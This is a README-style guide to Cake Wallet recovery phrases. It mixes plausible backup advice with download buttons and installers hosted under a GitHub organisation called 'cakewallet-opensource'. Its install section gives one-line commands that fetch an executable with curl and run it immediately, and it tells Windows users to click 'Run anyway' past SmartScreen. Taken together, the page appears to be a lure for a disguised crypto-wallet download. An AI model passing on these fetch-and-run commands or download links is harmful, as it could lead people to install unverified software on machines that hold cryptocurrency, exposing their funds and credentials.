![Cake Wallet backup recovery phrase guide](assets/cake-wallet-backup-recovery-phrase-article-banner.png)

# Cake Wallet Backup and Recovery Phrase

Where the words are, what they cover, and how to prove the backup works.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open the wallet you want to protect, go to its recovery phrase section, authenticate, and write the words on paper in order. Then prove it: restore the wallet on another device and confirm the balance. The phrase is the only thing that restores your funds, and a backup you have never tested is only a note.

<!-- ARTICLE-BODY-BEGIN -->

## Finding the phrase
The recovery phrase lives inside each wallet, not at app level, so the first step is choosing the right wallet from the list. Open it, find the backup or recovery phrase entry, and authenticate with the PIN. The app shows the words; it never sends them anywhere, and no support process needs them.

Write them by hand rather than copying a screenshot. A photo of a phrase on a phone that syncs to a cloud account is the most common way a careful backup becomes a leak. If you keep several wallets, note which phrase belongs to which wallet name before you put the paper away.

## What one backup covers
Each wallet has its own phrase. A Monero account and its subaddresses sit inside one wallet and are covered by that wallet's phrase; a second wallet inside the same app is not. Wallet groups do not merge keys either.

That single distinction explains most "my other wallet is empty" reports after a restore. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md">Manage multiple wallets in Cake Wallet</a> shows how wallets are organised and what a group does not merge.

Subaddresses add a second layer inside one Monero wallet. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-monero-accounts-subaddresses.md">Monero accounts and subaddresses</a> explains why funds sent to a subaddress belong to the account above it rather than to a wallet of their own.

## Proving the backup
A phrase you have read but never used is unverified. The test is cheap: restore it into a second install, check that the balance and history appear, then leave both copies in place or remove the test install. If the restore produces an empty wallet, you have found the problem while the original still works.

Do the test before you need it, not after a phone is lost. A restore that fails because of one mistyped word looks exactly like a wallet with no funds, and the difference only becomes obvious when you still have the original to compare against.

## Before you update
An update should not touch your wallet, but the phrase is what makes that safe rather than hopeful. Read it back once, confirm you can find the paper, and only then install the newer build over the current one.

Download the update from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and keep the old install until the new one opens and shows the balance. If the new build misbehaves, the phrase is still the route back, so no update is a one-way door.

## FAQ
### Where do I find the recovery phrase?
Inside the specific wallet's settings, behind PIN authentication. It is not shown at app level or in a general settings menu.
### Why are my Polyseed words red during restore?
The check marks words that are not in the expected list for that seed type, which usually means a mistyped word or the wrong language.
### Do I need to back up before updating?
Yes. The update normally keeps the wallet, but the backup is what protects you if it does not.
### Is a screenshot of the phrase acceptable?
No. Screenshots sync, get shared and stay in galleries; paper kept offline does not.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[restore a wallet in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [manage multiple wallets in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md) · [Monero accounts and subaddresses](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-monero-accounts-subaddresses.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
